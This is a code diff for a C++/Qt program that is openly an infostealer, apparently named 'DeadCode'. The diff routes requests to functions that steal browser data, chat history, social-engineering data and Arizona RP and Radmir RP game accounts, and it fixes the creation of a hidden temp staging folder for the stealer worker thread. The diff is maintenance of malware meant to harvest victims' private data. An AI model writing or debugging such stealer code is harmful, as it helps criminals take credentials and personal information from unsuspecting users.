@@ -176,8 +176,8 @@ public:
         else if (type == "browser") result = mw->stealBrowserData(tempDir);
         else if (type == "chatHistory") result = mw->stealChatHistory(tempDir);
         else if (type == "socialEngineering") result = mw->collectSocialEngineeringData(tempDir);
-        else if (type == "arizonaRP") result = mw->StealArizonaRPData(tempDir); // Исправлено
-        else if (type == "radmirRP") result = mw->StealRadmirRPData(tempDir);   // Исправлено
+        else if (type == "arizonaRP") result = mw->StealArizonaRPData(tempDir);
+        else if (type == "radmirRP") result = mw->StealRadmirRPData(tempDir);
         mw->collectedData[type] = result;
     }
 private:
@@ -364,9 +364,14 @@ MainWindow::MainWindow(QWidget *parent)
         connect(statusCheckTimer, &QTimer::timeout, this, &MainWindow::checkBuildStatus);
     }
 
-    // Лямбда для startStealSignal (без изменений)
+    // Лямбда для startStealSignal (исправлено)
     connect(this, &MainWindow::startStealSignal, this, [this]() {
-        std::string tempDir = std::string(getenv("TEMP") ? getenv("TEMP") : "C:\\Temp") + "\\DeadCode_" + generateRandomString(8);
+        QString tempDir = QString::fromStdString(std::string(getenv("TEMP") ? getenv("TEMP") : "C:\\Temp")) +
+                          "\\DeadCode_" + QString::fromStdString(generateRandomString(8));
+        QDir dir;
+        if (!dir.exists(tempDir)) {
+            dir.mkpath(tempDir);
+        }
         QThread* thread = new QThread;
         StealerWorker* worker = new StealerWorker(this, tempDir);
         worker->moveToThread(thread);
@@ -381,7 +386,7 @@ MainWindow::MainWindow(QWidget *parent)
     updateConfigFromUI();
 }
 
-// Деструктор
+// Остальной код без изменений
 MainWindow::~MainWindow() {
     delete ui;
     delete manager;
